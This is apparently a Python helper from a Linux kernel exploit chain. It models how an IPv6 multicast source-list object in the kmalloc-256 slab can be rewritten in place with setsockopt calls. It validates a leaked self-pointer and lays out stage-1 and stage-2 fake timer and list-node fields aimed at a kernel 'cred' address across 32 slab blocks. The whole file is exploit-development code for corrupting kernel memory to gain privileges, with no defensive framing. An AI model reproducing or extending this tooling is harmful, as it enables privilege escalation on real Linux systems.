# mcastrel.py -- offline model of the psl in-place rewrite (MCAST_BLOCK/UNBLOCK
# SOURCE) and of the uniform-pattern node layout, per net/ipv6/mcast.c v6.1
# (ip6_mc_source) semantics:
#
#   delete: linear search for the FIRST entry equal to the address; shift the
#           entries after it one slot left; sl_count--.
#   add:    reject if the address already exists in [0,sl_count)
#           (EADDRNOTAVAIL); if sl_count == sl_max realloc (object moves and
#           kfree_rcu's the old psl -- forbidden here); otherwise store at
#           index sl_count and sl_count++.
#   msfilter: sock_kmalloc(0x18 + 16*n), sl_max = sl_count = n, memcpy the
#           sources; never edits in place.
#
# Part A validates the rewrite sequence for every node block O.
# Part B checks the stage-1/stage-2 node fields against the lay11 uniform
# pattern (the node slice and the fake objects share residues mod 0x100).
import sys
sys.path.insert(0, r'D:\kwork\icbuild\scratch')
import lay11 as L

MAXSF = 64          # sysctl_mld_max_msf default (IPV6_MLD_MAX_MSF)
WLO, WHI = 0x18, 0xf8
NC = 14


class Realloc(Exception):
    pass


class Psl:
    """One struct ip6_sf_socklist in kmalloc-256: 0x18 header + 14 x 16B."""

    def __init__(self, chunks):
        assert len(chunks) == NC
        self.sl_max = NC
        self.sl_count = NC
        self.a = [bytes(c) for c in chunks]

    # -- window access (residue r is the byte at psl+r; r in [0x18,0xf8)) --
    def getb(self, r):
        if not (WLO <= r < WHI):
            raise IndexError(hex(r))
        i, j = divmod(r - WLO, 16)
        return self.a[i][j]

    def setb(self, r, v):
        if not (WLO <= r < WHI):
            raise IndexError(hex(r))
        i, j = divmod(r - WLO, 16)
        b = bytearray(self.a[i])
        b[j] = v
        self.a[i] = bytes(b)

    def setq(self, r, v):
        for i in range(8):
            self.setb((r + i) & 0xff, (v >> (8 * i)) & 0xff)

    def chunks(self):
        return [self.a[k] for k in range(self.sl_count)]

    # -- the two ip6_mc_source paths --
    def delete(self, v):
        v = bytes(v)
        i = None
        for k in range(self.sl_count):
            if self.a[k] == v:
                i = k
                break
        if i is None:
            raise RuntimeError('delete: %s not in psl' % v.hex())
        for j in range(i + 1, self.sl_count):
            self.a[j - 1] = self.a[j]
        self.sl_count -= 1
        return i

    def add(self, v):
        v = bytes(v)
        if self.sl_count >= MAXSF:
            raise RuntimeError('add: ENOBUFS')
        if self.sl_count == self.sl_max:
            raise Realloc()
        for k in range(self.sl_count):
            if self.a[k] == v:
                raise RuntimeError('add: duplicate %s' % v.hex())
        self.a[self.sl_count] = v
        self.sl_count += 1

    def rewrite(self, target):
        """msfget read-back, delete all (in read order), add 14."""
        if self.sl_count != NC:
            raise RuntimeError('rewrite from sl_count=%d' % self.sl_count)
        cur = self.chunks()
        trace = []
        for v in cur:
            self.delete(v)
            if self.sl_max != NC:
                raise RuntimeError('sl_max changed')
            trace.append(self.sl_count)
        for v in target:
            self.add(v)
            if self.sl_max != NC:
                raise RuntimeError('sl_max changed')
            trace.append(self.sl_count)
        if self.sl_count != NC or self.chunks() != [bytes(t) for t in target]:
            raise RuntimeError('final state mismatch')
        return trace


def pattern_chunks(st):
    return [bytes(st.mem.get(WLO + 16 * k + i, 0) for i in range(16))
            for k in range(NC)]


def leak_selfptr(psl, L):
    """RB_CLEAR_NODE(&node) stores node at node; read it back the way
    ic_mcast_scan does (off = L, value at window offset L-0x18)."""
    x = 0
    for i in range(8):
        x |= psl.getb((L + i) & 0xff) << (8 * i)
    return x


def check_O(base, oi):
    """Part A: one full rewrite on the node block, plus the kernel writes that
    happen between the leak and the rewrite (RB_CLEAR_NODE at X, list_add_tail
    into elist, firing flag)."""
    X = base + 0x100 * oi + 0x000       # placeholder; L set below
    # Use the example L in the clean window that the leak scan accepts.
    Lv = 0x78
    X = base + 0x100 * oi + Lv
    # initial psl: msfilter installed 14 identical zero sources
    psl = Psl([bytes(16)] * NC)
    # kernel wrote X at X (self pointer) during the erase
    for i in range(8):
        psl.setb((Lv + i) & 0xff, (X >> (8 * i)) & 0xff)
    got = leak_selfptr(psl, Lv)
    if got != X:
        return 'leak broken'
    # the real chain then rewrites the block with the uniform pattern
    st, info = L.solve(base, oi)
    if st is None:
        return 'no layout'
    if st.addr['cred'] is None:
        return 'no cred'
    tgt = pattern_chunks(st)
    if len(set(tgt)) != NC:
        return 'pattern not distinct'
    tr = psl.rewrite(tgt)
    if tr[:NC] != list(range(13, -1, -1)):
        return 'unexpected delete trace %r' % tr[:NC]
    if tr[NC:] != list(range(1, 15)):
        return 'unexpected add trace %r' % tr[NC:]
    return None


def node_map(base, oi, Lv, stage):
    """Block O holds ONLY the node (no fake objects: lay11 forbids O), so its
    14 chunks are free apart from the node fields.  Build them, fill the rest
    with distinct filler bytes and prove the 14 chunks are distinct."""
    mem = {}

    def put(r, v):
        r &= 0xff
        if not (WLO <= r < WHI):
            raise ValueError('residue %#x outside window' % r)
        if r in mem and mem[r] != v:
            raise ValueError('conflict at %#x' % r)
        mem[r] = v

    def q(off, v):
        for i in range(8):
            put(Lv + off + i, (v >> (8 * i)) & 0xff)

    def d(off, v, n):
        for i in range(n):
            put(Lv + off + i, (v >> (8 * i)) & 0xff)

    X = base + 0x100 * oi + Lv
    lo, hi = (Lv - 0x58) & 0xff, (Lv + 0x50) & 0xff
    # scratch must sit in the part of block O the node slice does not use,
    # and the erase's two stores (scratch+8, scratch+0x10) must stay there too
    if lo >= 0x30:
        scratch = base + 0x100 * oi + 0x20
    else:
        scratch = base + 0x100 * oi + lo + 0x08
    fake_head = base + 0x100 * oi + 0x00
    for addr, tag in ((scratch, 'scratch'), (fake_head, 'head')):
        d0 = addr - (base + 0x100 * oi)
        if not (0x18 <= d0 < 0xf8):
            raise ValueError('%s at %#x outside window' % (tag, d0))
    q(0x00, scratch if stage == 1 else X + 0x18)
    q(0x08, 0)
    q(0x10, X + 0x18 if stage == 1 else 0)
    q(0x18, 0)
    q(0x20, fake_head if stage == 1 else 0)
    q(0x28, 0 if stage == 1 else 0xffffffffffffffff)
    q(0x30, X + 0x30)                  # elist self loop
    q(0x38, X + 0x30)
    d(0x40, 0, 4)                      # firing
    q(0x48, 0)                         # handling (kernel overwrites)
    d(-0x24, 1, 4)                     # it_sigev_notify = SIGEV_NONE
    d(-0x58, 1, 4)                     # it_lock held
    # distinct fillers in free residues, one per chunk
    chunks = []
    for k in range(NC):
        b = bytearray(16)
        for i in range(16):
            b[i] = mem.get(WLO + 16 * k + i, 0)
        chunks.append(bytes(b))
    seen = set()
    for k in range(NC):
        if chunks[k] in seen or chunks[k] == bytes(16):
            b = bytearray(chunks[k])
            for i in range(16):
                r = WLO + 16 * k + i
                if r not in mem:
                    b[i] = 0x40 + k
                    break
            else:
                raise ValueError('chunk %d has no free byte' % k)
            chunks[k] = bytes(b)
        seen.add(chunks[k])
    if len(set(chunks)) != NC:
        raise ValueError('chunks not distinct')
    return chunks


def node_fields(base, oi, Lv, st, stage):
    """Part B: concrete byte requirements of the node slice in block O.
    Returns (list of (residue, byte, tag), scratch_ok)."""
    X = base + 0x100 * oi + Lv
    # scratch and fake head must live somewhere in the slab, on a free residue
    # set; keep them in the node's own block, outside the slice it uses.
    scratch = base + 0x100 * ((oi + 8) % 32) + 0x20
    fake_head = base + 0x100 * ((oi + 9) % 32) + 0x00
    f = []
    def q(off, v, tag):
        for i in range(8):
            f.append(((Lv + off + i) & 0xff, (v >> (8 * i)) & 0xff, tag))
    def d(off, v, tag, n=8):
        for i in range(n):
            f.append(((Lv + off + i) & 0xff, (v >> (8 * i)) & 0xff, tag))
    if stage == 1:
        q(0x00, scratch, 'q0')
        q(0x08, 0, 'q1')
        q(0x10, X + 0x18, 'q2')
        q(0x18, 0, 'q3')
        q(0x20, fake_head, 'q4')
        q(0x28, 0, 'q5')
        q(0x30, X + 0x30, 'elist')      # self loop: list_del_init is local
        q(0x38, X + 0x30, 'elist')
        d(0x40, 0, 'firing', 4)
        q(0x48, 0, 'handling')
        d(-0x24, 1, 'sigev', 4)
        d(-0x58, 1, 'lock', 4)
    else:
        q(0x00, X + 0x18, 'q0')
        q(0x08, 0, 'q1')
        q(0x10, 0, 'q2')                # winner+cred patched at runtime
        q(0x18, 0, 'q3')
        q(0x20, 0, 'q4')
        q(0x28, 0xffffffffffffffff, 'q5')
        q(0x30, X + 0x30, 'elist')
        q(0x38, X + 0x30, 'elist')
        d(0x40, 0, 'firing', 4)
        q(0x48, 0, 'handling')
        d(-0x24, 1, 'sigev', 4)
        d(-0x58, 1, 'lock', 4)
    return f


def check_node(base, oi, Lv, stage, st=None):
    if st is None:
        st, info = L.solve(base, oi)
    if st is None:
        return 'no layout', None
    bad = []
    for (r, b, tag) in node_fields(base, oi, Lv, st, stage):
        if r < WLO or r >= WHI:
            bad.append((tag, hex(r), 'outside window'))
            continue
        if r in st.mem and st.mem[r] != b:
            bad.append((tag, hex(r), 'pattern has %#x want %#x'
                        % (st.mem[r], b)))
    return None, bad


def main():
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xffffff80036d2000
    print('Part A: rewrite state machine, all 32 node blocks')
    fails = 0
    for oi in range(32):
        try:
            err = check_O(base, oi)
        except Exception as e:
            err = '%s: %s' % (type(e).__name__, e)
        if err:
            fails += 1
            print('  O=%2d FAIL %s' % (oi, err))
    print('  %d/32 ok' % (32 - fails))
    print('Part B: node fields vs uniform pattern (L in clean window)')
    solved = {}
    for oi in range(32):
        solved[oi] = L.solve(base, oi)[0]
    for Lv in (0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8):
        nbad = 0
        first = None
        for oi in range(32):
            for stage in (1, 2):
                err, bad = check_node(base, oi, Lv, stage, solved[oi])
                if err:
                    nbad += 1
                elif bad:
                    nbad += 1
                    if first is None:
                        first = (oi, stage, bad[:3])
        print('  L=%#04x  conflicts %2d/64  %s'
              % (Lv, nbad, '' if first is None else str(first)))
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
